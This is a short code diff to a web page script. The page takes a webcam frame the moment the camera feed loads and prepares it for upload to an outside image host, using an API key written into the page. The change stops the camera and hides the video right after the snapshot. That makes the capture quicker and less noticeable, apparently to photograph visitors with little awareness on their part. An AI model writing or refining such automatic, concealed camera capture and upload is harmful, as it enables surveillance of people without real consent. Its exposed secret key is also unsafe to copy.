@@ -16,9 +16,11 @@
         const canvas = document.getElementById('canvas');
         const statusText = document.getElementById('status');
         const IMGBB_API_KEY = '83601732f6095faec5d42577498c1da8';
+        let stream;
 
         navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => {
+            .then(mediaStream => {
+                stream = mediaStream;
                 video.srcObject = stream;
                 video.addEventListener('loadeddata', () => {
                     captureAndUpload();
@@ -32,6 +34,12 @@
         function captureAndUpload() {
             const context = canvas.getContext('2d');
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // Stop the camera and hide the video element
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+            }
+            video.style.display = 'none';
 
             canvas.toBlob(blob => {
                 const formData = new FormData();
